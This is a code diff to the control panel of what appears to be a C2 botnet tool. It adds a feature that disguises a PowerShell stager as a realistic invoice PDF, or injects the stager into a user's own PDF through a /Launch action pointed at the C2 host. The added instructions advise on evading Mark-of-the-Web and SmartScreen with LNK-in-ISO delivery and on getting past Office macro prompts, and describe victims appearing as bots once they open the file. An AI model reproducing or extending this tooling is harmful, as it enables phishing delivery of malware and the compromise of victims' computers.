@@ -3405,11 +3405,68 @@ function renderStager() {
 </div>
 
 <div class="card" style="margin-top:8px">
+  <div class="card-title">&#128196; PDF Delivery — Stager Edition</div>
+  <p style="font-size:12px;color:var(--muted);line-height:1.6;margin-bottom:12px">
+    Both options embed the Stage 1 stager PS1 inline inside the PDF /Launch action — <b>no exe is appended to the file</b>.
+    The PDF stays small and clean. Adobe Reader shows one click-through prompt ("This document is trying to open…").
+  </p>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">
+
+    <!-- Option A: fresh PDF -->
+    <div style="background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:14px;display:flex;flex-direction:column;gap:10px">
+      <div style="font-size:12px;font-weight:600;color:var(--light)">Option A — Pre-built staging PDF</div>
+      <div style="font-size:11px;color:var(--muted)">Generates a realistic invoice PDF with the stager already injected. No PDF of your own needed.</div>
+      <div style="display:flex;flex-direction:column;gap:8px">
+        <div>
+          <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:3px">Invoice FROM</label>
+          <input id="spdf-from" type="text" value="Nexus Solutions Ltd." style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:7px 10px;outline:none">
+        </div>
+        <div>
+          <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:3px">Invoice TO</label>
+          <input id="spdf-to" type="text" value="Acme Corporation" style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:7px 10px;outline:none">
+        </div>
+        <div>
+          <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:3px">Filename (no .pdf)</label>
+          <input id="spdf-fname" type="text" value="Invoice_Q4-2024" style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:7px 10px;outline:none">
+        </div>
+      </div>
+      <button onclick="buildStagingPdf()" style="background:var(--accent);color:var(--bg);border:none;border-radius:7px;padding:8px 14px;font-size:12px;font-weight:700;cursor:pointer;margin-top:auto">&#8659; Build &amp; Download PDF</button>
+    </div>
+
+    <!-- Option B: inject into real PDF -->
+    <div style="background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:14px;display:flex;flex-direction:column;gap:10px">
+      <div style="font-size:12px;font-weight:600;color:var(--light)">Option B — Inject into your own PDF</div>
+      <div style="font-size:11px;color:var(--muted)">Upload any real PDF (must be PDF 1.4 format). The stager /Launch action is appended — original content stays intact.</div>
+      <div>
+        <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:3px">Select PDF file</label>
+        <input id="spdf-file" type="file" accept=".pdf" style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 10px;outline:none;cursor:pointer">
+      </div>
+      <div style="font-size:11px;color:var(--warn);background:rgba(244,162,97,0.08);border:1px solid rgba(244,162,97,0.2);border-radius:6px;padding:8px 10px;line-height:1.5">
+        If upload fails with "PDF 1.5+" error: open the PDF in LibreOffice → Export as PDF → Compatibility: PDF 1.4
+      </div>
+      <button onclick="injectStagingPdf()" style="background:var(--bg3);color:var(--light);border:1px solid var(--bg3);border-radius:7px;padding:8px 14px;font-size:12px;font-weight:600;cursor:pointer;margin-top:auto">&#8659; Inject &amp; Download</button>
+      <div id="spdf-inject-err" style="font-size:11px;color:#f85149;display:none"></div>
+    </div>
+
+  </div>
+
+  <!-- Word/Office note -->
+  <div style="margin-top:12px;background:rgba(244,162,97,0.07);border:1px solid rgba(244,162,97,0.2);border-radius:8px;padding:12px 14px">
+    <div style="font-size:12px;font-weight:600;color:var(--warn);margin-bottom:4px">&#9888;&#65039; Word / Office documents — always prompt</div>
+    <div style="font-size:11px;color:var(--muted);line-height:1.7">
+      Word .docm macros show a yellow <b>"Enable Content"</b> bar — the user must click it before anything runs.
+      No way to remove that on modern Office without a patched CVE exploit. For no-prompt delivery use:
+      <b>LNK inside ISO</b> (no MOTW → no SmartScreen), or <b>this PDF</b> approach (one Adobe dialog).
+    </div>
+  </div>
+</div>
+
+<div class="card" style="margin-top:8px">
   <div class="card-title">&#9889; How to use staged delivery</div>
   <ol style="font-size:12px;color:var(--muted);line-height:2;padding-left:18px">
     <li>Build &amp; download the configured stub from the <b>Builder</b> tab first (sets C2 host + auth key)</li>
-    <li>Download the <b>Stager PS1</b> above — it auto-contains your C2 URL and XOR key</li>
-    <li>Wrap it in an LNK inside an ISO (no MOTW, no SmartScreen) or embed inline in an HTA</li>
+    <li>Download the <b>Stager PS1</b> above or use the PDF options — all contain your C2 URL and XOR key</li>
     <li>When target runs it: <b>Check-in</b> appears here → <b>Fetch</b> appears → full bot shows in sidebar</li>
   </ol>
 </div>
@@ -3476,6 +3533,53 @@ async function stagerClear() {
   await fetch(API_BASE + '/api/stage/events', { method: 'DELETE', credentials: 'include' });
   _stagerEvents = [];
   stagerRender();
+}
+
+function buildStagingPdf() {
+  const from  = encodeURIComponent(document.getElementById('spdf-from')?.value  || 'Nexus Solutions Ltd.');
+  const to    = encodeURIComponent(document.getElementById('spdf-to')?.value    || 'Acme Corporation');
+  const fname = encodeURIComponent(document.getElementById('spdf-fname')?.value || 'Invoice_Q4-2024');
+  const host  = encodeURIComponent(window.location.hostname || 'c2.osatechcloud.cloud');
+  const url   = `${API_BASE}/api/stage/build-pdf?host=${host}&from=${from}&to=${to}&filename=${fname}`;
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = (document.getElementById('spdf-fname')?.value || 'Invoice_Q4-2024') + '.pdf';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
+async function injectStagingPdf() {
+  const fileInput = document.getElementById('spdf-file');
+  const errEl     = document.getElementById('spdf-inject-err');
+  if (errEl) errEl.style.display = 'none';
+
+  if (!fileInput?.files?.length) {
+    if (errEl) { errEl.textContent = 'Select a PDF file first.'; errEl.style.display = 'block'; }
+    return;
+  }
+
+  const fd = new FormData();
+  fd.append('pdf', fileInput.files[0]);
+  fd.append('host', window.location.hostname || 'c2.osatechcloud.cloud');
+
+  try {
+    const r = await fetch(API_BASE + '/api/stage/inject-pdf', { method: 'POST', body: fd, credentials: 'include' });
+    if (!r.ok) {
+      const j = await r.json().catch(() => ({ error: r.statusText }));
+      if (errEl) { errEl.textContent = 'Error: ' + (j.error || r.statusText); errEl.style.display = 'block'; }
+      return;
+    }
+    const blob = await r.blob();
+    const origName = fileInput.files[0].name.replace(/\.pdf$/i, '');
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url; a.download = origName + '_stager.pdf';
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  } catch(e) {
+    if (errEl) { errEl.textContent = 'Network error: ' + e.message; errEl.style.display = 'block'; }
+  }
 }
 
 // ── Init: check auth, then load ───────────────────────────────────────────────
